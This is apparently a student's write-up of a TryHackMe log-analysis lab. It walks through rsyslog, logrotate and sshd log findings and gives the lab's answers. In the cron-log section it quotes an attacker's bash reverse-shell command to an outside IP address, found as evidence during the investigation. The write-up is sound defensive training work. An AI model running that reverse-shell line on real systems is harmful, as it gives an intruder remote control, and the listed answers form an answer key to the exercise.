# [Log Analysis]

**TryHackMe Path**: [SOC Level 2]  
**Lab Topic**: [Intro to Logs]  
**Date Completed**: [05/26/2026]

---

## 🧠 Summary

> In this lab, I learned the fundamentals of logging, including data sources, collection methods, and key principles needed to begin working in log analysis.

---

## 🎯 Objectives
- [ ] Understand the importance of logs as a historical activity record for identifying and mitigating potential threats
- [ ] Explore various types of logs, logging mechanisms and collection methods across multiple platforms
- [ ] Gain hands-on experience detecting and defeating adversaries through log analysis
      
---

## 🧰 Tools Used
- THM AttackBox
- Terminal

---

## 📊 Analysis & Screenshots

*** Expanding Perspectives: Logs as Evidence of Historical Activity ***

> In this section, I answered several questions by investigating a note left on the Desktop. For the first question, I identified the name of the colleague who left the note as
"Perry."
>
> <img width="567" height="418" alt="1" src="https://github.com/user-attachments/assets/c40d5d71-f59e-4754-921f-b9cdf7edf7a0" />
> <img width="580" height="307" alt="2" src="https://github.com/user-attachments/assets/fb2891a1-ce79-4b90-8394-5619cf4ce100" />

> I then discovered the full path to the suggested log file for initial investigation:
/var/log/gitlab/nginx/access.log
>
> <img width="1171" height="307" alt="3" src="https://github.com/user-attachments/assets/fadb6f99-ae23-4746-b938-d1ff364fc6a1" />

*** Collection, Management, and Centralisation ***

> In this section, I answered several questions related to log collection. After configuring rsyslog for sshd, I identified the username that repeatedly appeared in the sshd logs
at "/var/log/websrv-02/rsyslog_sshd.log", indicating failed login attempts or brute-force activity. The username was:
stansimon
>
> <img width="1284" height="169" alt="4" src="https://github.com/user-attachments/assets/a65d6436-302a-4194-901a-8339547798c1" />
> <img width="1003" height="234" alt="5" src="https://github.com/user-attachments/assets/9c4fea36-268b-4e26-a601-c55e6ae2cf0c" />

> I then identified the IP address of SIEM-02 based on the rsyslog configuration file "/etc/rsyslog.d/99-websrv-02-cron.conf", which is used to monitor cron messages:
10.10.10.101
>
> <img width="1130" height="171" alt="6" src="https://github.com/user-attachments/assets/4eb83e36-7d9d-4390-bd00-080c5fe2d4a9" />
> <img width="803" height="162" alt="7" src="https://github.com/user-attachments/assets/6637a59a-5ea1-4382-ac07-433f4fc3ed4b" />

> For the final question in this section, I identified the command executed by the root user based on logs in "/var/log/websrv-02/rsyslog_cron.log":
/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
>
> <img width="1219" height="440" alt="8" src="https://github.com/user-attachments/assets/7d4ea1dc-84fb-4cf6-95f8-fbc10b8443e1" />
> <img width="1181" height="207" alt="9" src="https://github.com/user-attachments/assets/5c9a9ab9-92c3-479a-b8b3-d488a4e27a61" />

*** Storage, Retention, Deletion ***

> In this section, I answered questions related to logrotate configurations. I identified that the total number of compressed log file versions retained, based on
"/etc/logrotate.d/99-websrv-02_cron.conf", is:
24
>
> <img width="1064" height="332" alt="10" src="https://github.com/user-attachments/assets/b9646908-a018-4eec-91ac-1d58148a9221" />

> The log rotation frequency identified was:
hourly
>
> <img width="1121" height="156" alt="11" src="https://github.com/user-attachments/assets/956f5cb8-5575-4100-9b72-ebbad4ccbefa" />

*** Hands-on Exercise: Log analysis process, tools, and techniques ***

> In the final section, I answered a question based on a parsed and consolidated log file viewed through the Log Viewer tool using the following URL:
http://MACHINE_IP:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log
I identified the error shown when applying filters to unparsed raw log files as:
"No date field"
>
> <img width="1238" height="405" alt="12" src="https://github.com/user-attachments/assets/252ed644-7c18-4a4e-b86a-27609753b671" />
> <img width="796" height="527" alt="13" src="https://github.com/user-attachments/assets/5e72ee1a-5867-420e-8292-7a39d3b098ae" />

--- 

## Reflection

> This lab strengthened my ability to understand and apply key log analysis concepts, including:

The importance of logs as records of historical activity for detecting and responding to threats
The different types of logs, how they are generated, and methods for collecting them across systems
The role of log analysis in detection engineering and incident response
Practical techniques for identifying and mitigating adversary activity through log analysis
